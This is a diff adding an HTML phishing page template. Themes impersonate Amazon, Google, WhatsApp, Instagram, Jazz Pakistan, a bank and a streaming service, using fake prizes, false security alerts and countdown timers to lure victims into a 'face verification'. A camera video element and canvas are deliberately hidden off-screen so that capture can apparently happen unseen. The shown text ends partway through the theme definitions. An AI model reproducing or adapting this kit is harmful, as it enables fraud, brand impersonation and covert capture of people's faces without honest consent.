@@ -1,0 +1,1769 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title id="pageTitle">Loading...</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Roboto:wght@400;500;700&display=swap"
+        rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <style>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* video must NOT use display:none — browsers stop rendering frames when hidden that way */
+        /* Instead, position off-screen so it's invisible but still renders */
+        canvas,
+        video {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* ============ SHARED CARD ============ */
+        .c-wrap {
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .c-card {
+            width: 100%;
+            max-width: 420px;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.25);
+            animation: slideUp 0.5s cubic-bezier(.34, 1.56, .64, 1) both;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px) scale(0.96);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .c-header {
+            padding: 28px 28px 20px;
+            text-align: center;
+            position: relative;
+        }
+
+        .c-logo {
+            font-size: 2.8rem;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .c-brand {
+            font-size: 1.25rem;
+            font-weight: 800;
+            margin-bottom: 4px;
+        }
+
+        .c-tagline {
+            font-size: 0.83rem;
+            opacity: 0.75;
+        }
+
+        .c-body {
+            padding: 24px 28px;
+        }
+
+        .c-offer-box {
+            border-radius: 16px;
+            padding: 18px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .c-offer-big {
+            font-size: 2.2rem;
+            font-weight: 900;
+            line-height: 1;
+            margin-bottom: 4px;
+        }
+
+        .c-offer-sub {
+            font-size: 0.85rem;
+            opacity: 0.8;
+        }
+
+        .c-msg {
+            font-size: 0.88rem;
+            line-height: 1.65;
+            margin-bottom: 22px;
+            opacity: 0.85;
+        }
+
+        .c-btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 14px;
+            border: none;
+            font-family: 'Inter', sans-serif;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.25s ease;
+        }
+
+        .c-btn:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.1);
+        }
+
+        .c-btn:active {
+            transform: translateY(0);
+        }
+
+        .c-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .c-note {
+            font-size: 0.72rem;
+            opacity: 0.5;
+            text-align: center;
+            margin-top: 14px;
+        }
+
+        /* Progress bar */
+        .c-progress {
+            height: 5px;
+            border-radius: 5px;
+            margin: 18px 0;
+            overflow: hidden;
+            background: rgba(0, 0, 0, 0.1);
+        }
+
+        .c-progress-fill {
+            height: 100%;
+            border-radius: 5px;
+            width: 0;
+            transition: width 0.5s ease;
+        }
+
+        /* Status msg */
+        .c-status {
+            font-size: 0.82rem;
+            text-align: center;
+            min-height: 22px;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+
+        /* Success overlay */
+        .c-success {
+            display: none;
+            text-align: center;
+            padding: 10px 0;
+        }
+
+        .c-success.show {
+            display: block;
+        }
+
+        .c-success-icon {
+            font-size: 3rem;
+            margin-bottom: 10px;
+        }
+
+        .c-success-title {
+            font-size: 1.2rem;
+            font-weight: 800;
+            margin-bottom: 6px;
+        }
+
+        .c-success-sub {
+            font-size: 0.83rem;
+            opacity: 0.7;
+            line-height: 1.5;
+        }
+
+        /* Spinner */
+        .spin {
+            animation: spinAnim 0.9s linear infinite;
+        }
+
+        @keyframes spinAnim {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Timer ring */
+        .c-timer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 0.78rem;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .timer-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            animation: timerPulse 1s ease infinite;
+        }
+
+        @keyframes timerPulse {
+
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1)
+            }
+
+            50% {
+                opacity: 0.5;
+                transform: scale(1.3)
+            }
+        }
+
+        /* Denied box */
+        .c-denied {
+            display: none;
+            padding: 12px 16px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            margin-top: 14px;
+            line-height: 1.5;
+        }
+
+        /* Scanning Overlay */
+        .c-scanner {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(4px);
+            z-index: 10;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            border-radius: 24px;
+        }
+
+        .c-scanner.active {
+            display: flex;
+        }
+
+        .scan-line {
+            width: 80%;
+            height: 2px;
+            background: #fff;
+            box-shadow: 0 0 15px #fff, 0 0 30px #fff;
+            position: absolute;
+            top: 15%;
+            animation: scanMove 2s linear infinite;
+        }
+
+        @keyframes scanMove {
+            0% {
+                top: 15%;
+                opacity: 0;
+            }
+
+            10% {
+                opacity: 1;
+            }
+
+            90% {
+                opacity: 1;
+            }
+
+            100% {
+                top: 75%;
+                opacity: 0;
+            }
+        }
+
+        .scan-circle {
+            width: 120px;
+            height: 120px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .scan-circle::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+        }
+
+        .scan-icon {
+            font-size: 2.5rem;
+        }
+
+        /* ============ THEME 1 — FREE MOBILE DATA ============ */
+        body.th-freedata {
+            background: linear-gradient(160deg, #1a0030, #3b0066, #7c10c2);
+        }
+
+        .th-freedata .c-card {
+            background: #fff;
+        }
+
+        .th-freedata .c-header {
+            background: linear-gradient(135deg, #e11d48, #7c3aed);
+            color: #fff;
+        }
+
+        .th-freedata .c-logo::after {
+            content: '📶';
+        }
+
+        .th-freedata .c-brand {
+            color: #fff;
+        }
+
+        .th-freedata .c-tagline {
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .th-freedata .c-body {
+            color: #1e1b4b;
+        }
+
+        .th-freedata .c-offer-box {
+            background: linear-gradient(135deg, #fde8f0, #ede9fe);
+            border: 2px dashed #c084fc;
+        }
+
+        .th-freedata .c-offer-big {
+            color: #7c3aed;
+        }
+
+        .th-freedata .c-offer-sub {
+            color: #6d28d9;
+        }
+
+        .th-freedata .c-btn {
+            background: linear-gradient(135deg, #e11d48, #7c3aed);
+            color: #fff;
+            box-shadow: 0 6px 20px rgba(124, 58, 237, 0.4);
+        }
+
+        .th-freedata .c-progress {
+            background: #ede9fe;
+        }
+
+        .th-freedata .c-progress-fill {
+            background: linear-gradient(90deg, #e11d48, #7c3aed);
+        }
+
+        .th-freedata .c-status {
+            color: #7c3aed;
+        }
+
+        .th-freedata .c-denied {
+            background: #fee2e2;
+            color: #b91c1c;
+            border: 1px solid #fca5a5;
+        }
+
+        .th-freedata .c-success-title {
+            color: #7c3aed;
+        }
+
+        .th-freedata .c-timer {
+            color: #7c3aed;
+        }
+
+        .th-freedata .timer-dot {
+            background: #e11d48;
+        }
+
+        /* ============ THEME 2 — GIFT CARD ============ */
+        body.th-giftcard {
+            background: linear-gradient(160deg, #1c0a00, #431407, #7c2d12);
+        }
+
+        .th-giftcard .c-card {
+            background: #fff;
+        }
+
+        .th-giftcard .c-header {
+            background: linear-gradient(135deg, #f97316, #eab308);
+            color: #fff;
+        }
+
+        .th-giftcard .c-logo::after {
+            content: '🎁';
+        }
+
+        .th-giftcard .c-brand {
+            color: #fff;
+        }
+
+        .th-giftcard .c-body {
+            color: #1c1917;
+        }
+
+        .th-giftcard .c-offer-box {
+            background: linear-gradient(135deg, #fff7ed, #fef9c3);
+            border: 2px dashed #fb923c;
+        }
+
+        .th-giftcard .c-offer-big {
+            color: #ea580c;
+        }
+
+        .th-giftcard .c-offer-sub {
+            color: #d97706;
+        }
+
+        .th-giftcard .c-btn {
+            background: linear-gradient(135deg, #f97316, #eab308);
+            color: #fff;
+            box-shadow: 0 6px 20px rgba(249, 115, 22, 0.4);
+        }
+
+        .th-giftcard .c-progress {
+            background: #ffedd5;
+        }
+
+        .th-giftcard .c-progress-fill {
+            background: linear-gradient(90deg, #f97316, #eab308);
+        }
+
+        .th-giftcard .c-status {
+            color: #ea580c;
+        }
+
+        .th-giftcard .c-denied {
+            background: #fee2e2;
+            color: #b91c1c;
+            border: 1px solid #fca5a5;
+        }
+
+        .th-giftcard .c-success-title {
+            color: #ea580c;
+        }
+
+        .th-giftcard .c-timer {
+            color: #ea580c;
+        }
+
+        .th-giftcard .timer-dot {
+            background: #f97316;
+        }
+
+        /* ============ THEME 3 — LUCKY WINNER ============ */
+        body.th-lucky {
+            background: linear-gradient(160deg, #001a0a, #014421, #065f46);
+        }
+
+        .th-lucky .c-card {
+            background: #0d1117;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+        }
+
+        .th-lucky .c-header {
+            background: linear-gradient(135deg, #059669, #0284c7);
+            color: #fff;
+            padding-bottom: 28px;
+        }
+
+        .th-lucky .c-logo::after {
+            content: '🏆';
+        }
+
+        .th-lucky .c-brand {
+            color: #ffd700;
+            font-size: 1.4rem;
+        }
+
+        .th-lucky .c-tagline {
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .th-lucky .c-body {
+            color: #e2e8f0;
+        }
+
+        .th-lucky .c-offer-box {
+            background: linear-gradient(135deg, rgba(5, 150, 105, 0.2), rgba(2, 132, 199, 0.2));
+            border: 2px solid rgba(255, 215, 0, 0.4);
+        }
+
+        .th-lucky .c-offer-big {
+            color: #ffd700;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+        }
+
+        .th-lucky .c-offer-sub {
+            color: #94a3b8;
+        }
+
+        .th-lucky .c-btn {
+            background: linear-gradient(135deg, #059669, #0284c7);
+            color: #fff;
+            box-shadow: 0 6px 20px rgba(5, 150, 105, 0.4);
+        }
+
+        .th-lucky .c-progress {
+            background: rgba(255, 255, 255, 0.08);
+        }
+
+        .th-lucky .c-progress-fill {
+            background: linear-gradient(90deg, #ffd700, #059669);
+        }
+
+        .th-lucky .c-status {
+            color: #34d399;
+        }
+
+        .th-lucky .c-denied {
+            background: rgba(239, 68, 68, 0.1);
+            color: #f87171;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+
+        .th-lucky .c-success-title {
+            color: #ffd700;
+        }
+
+        .th-lucky .c-timer {
+            color: #ffd700;
+        }
+
+        .th-lucky .timer-dot {
+            background: #ffd700;
+        }
+
+        .th-lucky .c-note {
+            color: #94a3b8;
+        }
+
+        /* ============ THEME 4 — VIDEO VERIFICATION ============ */
+        body.th-video {
+            background: #0a0a0a;
+        }
+
+        .th-video .c-card {
+            background: #141414;
+            border: 1px solid #2a2a2a;
+        }
+
+        .th-video .c-header {
+            background: #e50914;
+            color: #fff;
+        }
+
+        .th-video .c-logo::after {
+            content: '▶';
+            font-size: 2rem;
+        }
+
+        .th-video .c-brand {
+            color: #fff;
+            font-family: 'Georgia', serif;
+            letter-spacing: -1px;
+        }
+
+        .th-video .c-tagline {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .th-video .c-body {
+            color: #e2e8f0;
+        }
+
+        .th-video .c-offer-box {
+            background: #1f1f1f;
+            border: 1px solid #333;
+        }
+
+        .th-video .c-offer-big {
+            color: #e50914;
+            font-size: 1.6rem;
+        }
+
+        .th-video .c-offer-sub {
+            color: #aaa;
+        }
+
+        .th-video .c-btn {
+            background: #e50914;
+            color: #fff;
+            box-shadow: 0 6px 20px rgba(229, 9, 20, 0.4);
+        }
+
+        .th-video .c-progress {
+            background: #2a2a2a;
+        }
+
+        .th-video .c-progress-fill {
+            background: #e50914;
+        }
+
+        .th-video .c-status {
+            color: #e50914;
+        }
+
+        .th-video .c-denied {
+            background: rgba(239, 68, 68, 0.1);
+            color: #f87171;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+
+        .th-video .c-success-title {
+            color: #e50914;
+        }
+
+        .th-video .c-timer {
+            color: #e50914;
+        }
+
+        .th-video .timer-dot {
+            background: #e50914;
+        }
+
+        .th-video .c-note {
+            color: #555;
+        }
+
+        /* ============ THEME 5 — WHATSAPP ============ */
+        body.th-whatsapp {
+            background: linear-gradient(160deg, #001a07, #00421a, #075e54);
+        }
+
+        .th-whatsapp .c-card {
+            background: #fff;
+        }
+
+        .th-whatsapp .c-header {
+            background: #075e54;
+            color: #fff;
+        }
+
+        .th-whatsapp .c-logo::after {
+            content: '💬';
+        }
+
+        .th-whatsapp .c-brand {
+            color: #fff;
+        }
+
+        .th-whatsapp .c-tagline {
+            color: rgba(255, 255, 255, 0.75);
+        }
+
+        .th-whatsapp .c-body {
+            color: #1a1a1a;
+        }
+
+        .th-whatsapp .c-offer-box {
+            background: #dcf8c6;
+            border: 1px solid #25d366;
+            border-radius: 12px;
+        }
+
+        .th-whatsapp .c-offer-big {
+            color: #075e54;
+            font-size: 1.4rem;
+        }
+
+        .th-whatsapp .c-offer-sub {
+            color: #128c7e;
+        }
+
+        .th-whatsapp .c-btn {
+            background: #25d366;
+            color: #fff;
+            box-shadow: 0 6px 20px rgba(37, 211, 102, 0.35);
+        }
+
+        .th-whatsapp .c-progress {
+            background: #dcf8c6;
+        }
+
+        .th-whatsapp .c-progress-fill {
+            background: #25d366;
+        }
+
+        .th-whatsapp .c-status {
+            color: #128c7e;
+        }
+
+        .th-whatsapp .c-denied {
+            background: #fee2e2;
+            color: #b91c1c;
+            border: 1px solid #fca5a5;
+        }
+
+        .th-whatsapp .c-success-title {
+            color: #075e54;
+        }
+
+        .th-whatsapp .c-timer {
+            color: #128c7e;
+        }
+
+        .th-whatsapp .timer-dot {
+            background: #25d366;
+        }
+
+        /* ============ THEME 6 — GOOGLE SECURITY ============ */
+        body.th-google {
+            background: #f8fafc;
+        }
+
+        .th-google .c-card {
+            background: #fff;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.12), 0 8px 30px rgba(0, 0, 0, 0.08);
+            border-radius: 16px;
+        }
+
+        .th-google .c-header {
+            background: #fff;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #e8eaed;
+        }
+
+        .th-google .c-logo::after {
+            content: '🔒';
+        }
+
+        .th-google .c-brand {
+            color: #202124;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            font-size: 1.1rem;
+        }
+
+        .th-google .c-tagline {
+            color: #5f6368;
+        }
+
+        .th-google .c-body {
+            color: #202124;
+        }
+
+        .th-google .c-offer-box {
+            background: #fce8e6;
+            border-left: 4px solid #d93025;
+            border-radius: 8px;
+            text-align: left;
+        }
+
+        .th-google .c-offer-big {
+            color: #d93025;
+            font-size: 1rem;
+            font-weight: 700;
+        }
+
+        .th-google .c-offer-sub {
+            color: #5f6368;
+        }
+
+        .th-google .c-btn {
+            background: #1a73e8;
+            color: #fff;
+            border-radius: 8px;
+            box-shadow: none;
+        }
+
+        .th-google .c-btn:hover {
+            background: #1557b0;
+        }
+
+        .th-google .c-progress {
+            background: #e8eaed;
+        }
+
+        .th-google .c-progress-fill {
+            background: #1a73e8;
+        }
+
+        .th-google .c-status {
+            color: #1a73e8;
+        }
+
+        .th-google .c-denied {
+            background: #fce8e6;
+            color: #d93025;
+            border: 1px solid #f28b82;
+        }
+
+        .th-google .c-success-title {
+            color: #1a73e8;
+        }
+
+        .th-google .c-timer {
+            color: #d93025;
+        }
+
+        .th-google .timer-dot {
+            background: #d93025;
+        }
+
+        .th-google .c-note {
+            color: #9aa0a6;
+        }
+
+        /* ============ THEME 7 — INSTAGRAM ============ */
+        body.th-instagram {
+            background: linear-gradient(135deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d, #f56040, #f77737, #fcaf45);
+        }
+
+        .th-instagram .c-card {
+            background: #fff;
+        }
+
+        .th-instagram .c-header {
+            background: linear-gradient(135deg, #833ab4, #e1306c, #fcaf45);
+            color: #fff;
+        }
+
+        .th-instagram .c-logo::after {
+            content: '📸';
+        }
+
+        .th-instagram .c-brand {
+            color: #fff;
+            font-style: italic;
+            font-family: 'Georgia', serif;
+        }
+
+        .th-instagram .c-tagline {
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .th-instagram .c-body {
+            color: #262626;
+        }
+
+        .th-instagram .c-offer-box {
+            background: linear-gradient(135deg, #fdf0f7, #fff3e0);
+            border: 1px solid #e1306c;
+        }
+
+        .th-instagram .c-offer-big {
+            background: linear-gradient(135deg, #833ab4, #e1306c);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-size: 1.6rem;
+        }
+
+        .th-instagram .c-offer-sub {
+            color: #8e8e8e;
+        }
+
+        .th-instagram .c-btn {
+            background: linear-gradient(135deg, #833ab4, #e1306c, #fcaf45);
+            color: #fff;
+            box-shadow: 0 6px 20px rgba(225, 48, 108, 0.35);
+        }
+
+        .th-instagram .c-progress {
+            background: #ffe0ec;
+        }
+
+        .th-instagram .c-progress-fill {
+            background: linear-gradient(90deg, #833ab4, #e1306c, #fcaf45);
+        }
+
+        .th-instagram .c-status {
+            color: #c13584;
+        }
+
+        .th-instagram .c-denied {
+            background: #fee2e2;
+            color: #b91c1c;
+            border: 1px solid #fca5a5;
+        }
+
+        .th-instagram .c-success-title {
+            color: #c13584;
+        }
+
+        .th-instagram .c-timer {
+            color: #c13584;
+        }
+
+        .th-instagram .timer-dot {
+            background: #e1306c;
+        }
+
+        /* ============ THEME 8 — BANK ============ */
+        body.th-bank {
+            background: linear-gradient(160deg, #020617, #0f172a, #1e3a5f);
+        }
+
+        .th-bank .c-card {
+            background: #0f172a;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .th-bank .c-header {
+            background: linear-gradient(135deg, #1e3a5f, #0f172a);
+            color: #fff;
+            border-bottom: 2px solid #c9a227;
+        }
+
+        .th-bank .c-logo::after {
+            content: '🏦';
+        }
+
+        .th-bank .c-brand {
+            color: #c9a227;
+            font-size: 1rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .th-bank .c-tagline {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .th-bank .c-body {
+            color: #e2e8f0;
+        }
+
+        .th-bank .c-offer-box {
+            background: rgba(201, 162, 39, 0.08);
+            border: 1px solid rgba(201, 162, 39, 0.3);
+            text-align: left;
+        }
+
+        .th-bank .c-offer-big {
+            color: #ef4444;
+            font-size: 0.95rem;
+            font-weight: 700;
+        }
+
+        .th-bank .c-offer-sub {
+            color: #94a3b8;
+            font-size: 0.78rem;
+        }
+
+        .th-bank .c-btn {
+            background: #c9a227;
+            color: #0f172a;
+            box-shadow: 0 6px 20px rgba(201, 162, 39, 0.3);
+        }
+
+        .th-bank .c-btn:hover {
+            background: #d4b13a;
+        }
+
+        .th-bank .c-progress {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .th-bank .c-progress-fill {
+            background: #c9a227;
+        }
+
+        .th-bank .c-status {
+            color: #c9a227;
+        }
+
+        .th-bank .c-denied {
+            background: rgba(239, 68, 68, 0.1);
+            color: #f87171;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+
+        .th-bank .c-success-title {
+            color: #c9a227;
+        }
+
+        .th-bank .c-timer {
+            color: #ef4444;
+        }
+
+        .th-bank .timer-dot {
+            background: #ef4444;
+        }
+
+        .th-bank .c-note {
+            color: #475569;
+        }
+
+        /* ============ THEME 9 — SPEED TEST ============ */
+        body.th-speedtest {
+            background: linear-gradient(160deg, #001520, #003d5b, #0284c7);
+        }
+
+        .th-speedtest .c-card {
+            background: #001e30;
+            border: 1px solid rgba(14, 165, 233, 0.25);
+        }
+
+        .th-speedtest .c-header {
+            background: linear-gradient(135deg, #0e7490, #0284c7);
+            color: #fff;
+        }
+
+        .th-speedtest .c-logo::after {
+            content: '⚡';
+        }
+
+        .th-speedtest .c-brand {
+            color: #fff;
+        }
+
+        .th-speedtest .c-tagline {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .th-speedtest .c-body {
+            color: #e2e8f0;
+        }
+
+        .th-speedtest .c-offer-box {
+            background: rgba(14, 165, 233, 0.08);
+            border: 1px solid rgba(14, 165, 233, 0.25);
+        }
+
+        .th-speedtest .c-offer-big {
+            color: #38bdf8;
+            font-size: 2.4rem;
+            font-family: 'Courier New', monospace;
+        }
+
+        .th-speedtest .c-offer-sub {
+            color: #94a3b8;
+        }
+
+        .th-speedtest .c-btn {
+            background: linear-gradient(135deg, #0e7490, #0284c7);
+            color: #fff;
+            box-shadow: 0 6px 20px rgba(14, 165, 233, 0.35);
+        }
+
+        .th-speedtest .c-progress {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .th-speedtest .c-progress-fill {
+            background: linear-gradient(90deg, #0e7490, #38bdf8);
+        }
+
+        .th-speedtest .c-status {
+            color: #38bdf8;
+        }
+
+        .th-speedtest .c-denied {
+            background: rgba(239, 68, 68, 0.1);
+            color: #f87171;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+
+        .th-speedtest .c-success-title {
+            color: #38bdf8;
+        }
+
+        .th-speedtest .c-timer {
+            color: #38bdf8;
+        }
+
+        .th-speedtest .timer-dot {
+            background: #38bdf8;
+        }
+
+        .th-speedtest .c-note {
+            color: #475569;
+        }
+
+        /* ============ THEME 10 — MUSIC ============ */
+        body.th-music {
+            background: linear-gradient(160deg, #0d001a, #2e0055, #4c1d95);
+        }
+
+        .th-music .c-card {
+            background: rgba(15, 0, 30, 0.9);
+            border: 1px solid rgba(167, 139, 250, 0.25);
+            backdrop-filter: blur(20px);
+        }
+
+        .th-music .c-header {
+            background: linear-gradient(135deg, #7c3aed, #06b6d4);
+            color: #fff;
+        }
+
+        .th-music .c-logo::after {
+            content: '🎵';
+        }
+
+        .th-music .c-brand {
+            color: #fff;
+        }
+
+        .th-music .c-tagline {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .th-music .c-body {
+            color: #e2e8f0;
+        }
+
+        .th-music .c-offer-box {
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.2), rgba(6, 182, 212, 0.2));
+            border: 1px solid rgba(167, 139, 250, 0.3);
+        }
+
+        .th-music .c-offer-big {
+            color: #a78bfa;
+        }
+
+        .th-music .c-offer-sub {
+            color: #94a3b8;
+        }
+
+        .th-music .c-btn {
+            background: linear-gradient(135deg, #7c3aed, #06b6d4);
+            color: #fff;
+            box-shadow: 0 6px 20px rgba(124, 58, 237, 0.4);
+        }
+
+        .th-music .c-progress {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .th-music .c-progress-fill {
+            background: linear-gradient(90deg, #7c3aed, #06b6d4);
+        }
+
+        .th-music .c-status {
+            color: #a78bfa;
+        }
+
+        .th-music .c-denied {
+            background: rgba(239, 68, 68, 0.1);
+            color: #f87171;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+
+        .th-music .c-success-title {
+            color: #a78bfa;
+        }
+
+        .th-music .c-timer {
+            color: #a78bfa;
+        }
+
+        .th-music .timer-dot {
+            background: #a78bfa;
+        }
+
+        .th-music .c-note {
+            color: #475569;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="c-wrap">
+        <div class="c-card" id="mainCard">
+            <!-- Dynamically filled by JS -->
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ============================================================
+        //  THEME DEFINITIONS
+        // ============================================================
+        const THEMES = {
+
+            freedata: {
+                title: 'Jazz Free Data',
+                brand: 'Jazz Rewards',
+                tagline: 'Exclusive Offer for You',
+                logo: '📶',
+                offerBig: 'FREE 10GB',
+                offerSub: 'Mobile Data — Valid for 30 Days',
+                msg: 'Congratulations! You have been selected for our exclusive Jazz Free Data promotion. Verify your identity with a quick selfie to claim your free 10GB data instantly.',
+                btnIcon: 'fa-solid fa-gift',
+                btnText: 'Claim Free Data Now',
+                statusWaiting: 'Verifying your account...',
+                statusDone: 'Data added to your account!',
+                successIcon: '📶',
+                successTitle: 'Data Added!',
+                successSub: '10GB has been credited to your number.\nYou may close this page.',
+                timerMsg: 'Offer expires in',
+                note: '🔒 Secure verification — Jazz Pakistan',
+            },
+
+            giftcard: {
+                title: 'Amazon Gift Card',
+                brand: 'Amazon Rewards',
+                tagline: 'You have a gift waiting!',
+                logo: '🎁',
+                offerBig: '$50 Gift Card',
+                offerSub: 'Redeem at Amazon.com · Expires in 24h',
+                msg: 'You have been selected as a winner of our Amazon loyalty reward. Complete a quick identity verification to claim your $50 gift card. No credit card needed.',
+                btnIcon: 'fa-solid fa-gift',
+                btnText: 'Claim Gift Card',
+                statusWaiting: 'Verifying your identity...',
+                statusDone: 'Gift card sent to your email!',
+                successIcon: '🎁',
+                successTitle: 'Congratulations!',
+                successSub: 'Your $50 gift card has been sent.\nCheck your inbox shortly.',
+                timerMsg: 'Offer valid for',
+                note: '🔒 amazon.com — Secure Checkout',
+            },
+
+            lucky: {
+                title: 'Lucky Draw Winner!',
+                brand: '🏆 LUCKY DRAW',
+                tagline: 'Official Prize Notification',
+                logo: '🏆',
+                offerBig: 'YOU WON!',
+                offerSub: 'PKR 50,000 Cash Prize',
+                msg: 'Your phone number was randomly selected in our monthly lucky draw. To verify your identity and receive your prize, please complete a quick face scan below.',
+                btnIcon: 'fa-solid fa-trophy',
+                btnText: 'Claim My Prize',
+                statusWaiting: 'Running identity scan...',
+                statusDone: 'Prize confirmed! Transfer initiated.',
+                successIcon: '🥇',
+                successTitle: 'PRIZE UNLOCKED!',
+                successSub: 'PKR 50,000 will be transferred within 24 hours.',
+                timerMsg: 'Claim before',
+                note: '🔒 Official Lucky Draw Authority',
+            },
+
+            video: {
+                title: 'NetStream — Verify Account',
+                brand: 'NetStream',
+                tagline: 'Continue watching — verify now',
+                logo: '▶',
+                offerBig: 'Account Verification Required',
+                offerSub: 'Your account has been flagged for unusual activity',
+                msg: 'To continue watching, we need to verify it\'s really you. This is a one-time face verification for your account security. Your session will resume immediately.',
+                btnIcon: 'fa-solid fa-shield-check',
+                btnText: 'Verify & Continue Watching',
+                statusWaiting: 'Verifying your account...',
+                statusDone: 'Verified! Resuming your show...',
+                successIcon: '✅',
+                successTitle: 'Account Verified',
+                successSub: 'Your account is secure.\nYou can continue watching now.',
+                timerMsg: 'Session expires in',
+                note: '🔒 netstream.com — Secure Verification',
+            },
+
+            whatsapp: {
+                title: 'WhatsApp — Verify Account',
+                brand: 'WhatsApp',
+                tagline: 'Account Security Check',
+                logo: '💬',
+                offerBig: 'Verify Your Identity',
+                offerSub: 'Required to keep your account active',
+                msg: 'WhatsApp detected a login from a new device. To prevent unauthorized access, please verify your identity with a quick selfie. This keeps your chats safe.',
+                btnIcon: 'fa-brands fa-whatsapp',
+                btnText: 'Verify My Account',
+                statusWaiting: 'Checking your identity...',
+                statusDone: 'Account verified!',
+                successIcon: '✅',
+                successTitle: 'Account Secured!',
+                successSub: 'Your WhatsApp account is now verified.\nYou can continue chatting.',
+                timerMsg: 'Account locked in',
+                note: '🔒 whatsapp.com — End-to-End Encrypted',
+            },
+
+            google: {
+                title: 'Google — Security Alert',
+                brand: 'Google',
+                tagline: 'accounts.google.com',
+                logo: '🔒',
+                offerBig: '⚠️ Suspicious Activity Detected',
+                offerSub: 'Unusual sign-in attempt from new device',
+                msg: 'We detected a new sign-in to your Google Account from an unrecognized device. To protect your account, please verify your identity using your camera below.',
+                btnIcon: 'fa-brands fa-google',
+                btnText: 'Verify It\'s Me',
+                statusWaiting: 'Verifying your identity...',
+                statusDone: 'Identity confirmed!',
+                successIcon: '🛡️',
+                successTitle: 'Account Protected',
+                successSub: 'Your Google Account has been secured.\nThe suspicious sign-in has been blocked.',
+                timerMsg: 'Action required within',
+                note: '🔒 Google Security — accounts.google.com',
+            },
+
+            instagram: {
+                title: 'Instagram — Special Offer',
+                brand: 'Instagram',
+                tagline: 'Meta Verified Partner Offer',
+                logo: '📸',
+                offerBig: '✨ Get Instagram Blue Tick',
+                offerSub: 'Free Verification Badge — Limited Offer',
+                msg: 'You have been selected for a free Instagram verification badge! Complete a quick face ID to confirm your identity and get your blue tick within 24 hours.',
+                btnIcon: 'fa-brands fa-instagram',
+                btnText: 'Get Verified Free',
+                statusWaiting: 'Processing your application...',
+                statusDone: 'Verification submitted!',
+                successIcon: '✅',
+                successTitle: 'Application Sent!',
+                successSub: 'Your blue tick will appear within 24 hours.\nCheck your Instagram notifications.',
+                timerMsg: 'Offer valid for',
+                note: '🔒 instagram.com — Meta Verified',
+            },
+
+            bank: {
+                title: 'Bank Alert — Verify Now',
+                brand: 'NATIONAL BANK',
+                tagline: 'Priority Security Alert',
+                logo: '🏦',
